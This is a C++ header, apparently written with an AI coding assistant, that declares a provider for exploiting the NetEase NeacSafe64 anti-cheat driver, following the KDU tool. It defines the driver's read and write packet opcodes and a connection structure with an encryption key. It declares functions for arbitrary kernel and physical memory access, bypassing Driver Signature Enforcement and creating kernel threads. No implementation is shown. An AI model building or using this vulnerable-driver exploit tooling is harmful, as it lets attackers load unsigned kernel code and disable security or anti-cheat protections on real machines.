/**
 * @file NeacSafe64Provider.h
 * @author GitHub Copilot (based on authentic KDU implementation)
 * @date September 9, 2025
 * @brief NeacSafe64 vulnerable driver provider interface.
 * 
 * This provider implements the authentic KDU approach for NeacSafe64
 * NetEase anti-cheat driver exploitation. Based on the original KDU
 * source code from https://github.com/hfiref0x/KDU
 * 
 * Reference: https://github.com/smallzhong/NeacController
 */

#pragma once

#include "IProvider.h"
#include <fltUser.h>
#include <strsafe.h>
#include <intrin.h>

namespace KernelMode {
    namespace Providers {

        // Based on authentic KDU NeacSafe64 implementation
        #define OpCode_ReadVM 14
        #define OpCode_WriteVM 70

        #pragma pack(1)
        typedef struct _NEAC_READ_PACKET {
            BYTE Opcode;
            PVOID Src;
            DWORD Size;
        } NEAC_READ_PACKET, *PNEAC_READ_PACKET;
        #pragma pack()

        #pragma pack(1)
        typedef struct _NEAC_WRITE_PACKET {
            BYTE Opcode;
            PVOID Dst;
            PVOID Src;
            DWORD Size;
        } NEAC_WRITE_PACKET, *PNEAC_WRITE_PACKET;
        #pragma pack()

        #pragma pack(1)
        typedef struct _NEAC_FILTER_CONNECT {
            DWORD Magic;
            DWORD Version;
            BYTE EncKey[32];
        } NEAC_FILTER_CONNECT, *PNEAC_FILTER_CONNECT;
        #pragma pack()

        class NeacSafe64Provider : public IProvider {
        public:
            NeacSafe64Provider();
            ~NeacSafe64Provider() override;

            bool Initialize(ULONG driverId = 0, bool bypassDSE = false) override;
            void Deinitialize() override;
            std::wstring GetProviderName() const override;

            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool BypassDSE() override;
            ULONG GetCapabilities() const override;
            const ProviderLoadData* GetLoadData() const override;
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override;
            uintptr_t AllocateKernelMemory(size_t size, uintptr_t* physicalAddress = nullptr) override;
            bool FreeKernelMemory(uintptr_t virtualAddress, size_t size) override;
            bool CreateSystemThread(uintptr_t startAddress, uintptr_t parameter = 0) override;

            // Enhanced status-returning methods for better error handling
            ProviderStatus ReadKernelMemoryEx(uintptr_t address, void* buffer, size_t size);
            ProviderStatus WriteKernelMemoryEx(uintptr_t address, void* buffer, size_t size);

        private:
            HANDLE portHandle;
            bool isInitialized;
            std::wstring driverFilePath;  // Store temporary driver file path for cleanup
            static ProviderLoadData loadData;

            // Authentic KDU encryption functions (matching exact KDU names)
            static void NetEaseEncyptBuffer(unsigned int* buffer, unsigned int idx);
            static void NetEaseSafeEncodePayload(PBYTE key, PBYTE buffer, SIZE_T size);
            
            // Authentic KDU connection
            HANDLE ConnectToDriver();
            bool StartVulnerableDriver();
            void StopVulnerableDriver();

            // Authentic KDU memory operations
            bool ReadVirtualMemoryDirect(uintptr_t address, void* buffer, size_t size);
            bool WriteVirtualMemoryDirect(uintptr_t address, void* buffer, size_t size);

            // Static encryption key and immutable data from authentic KDU
            static BYTE encryptionKey[33];
            static unsigned char encryptionImm[16];
        };

    } // namespace Providers
} // namespace KernelMode
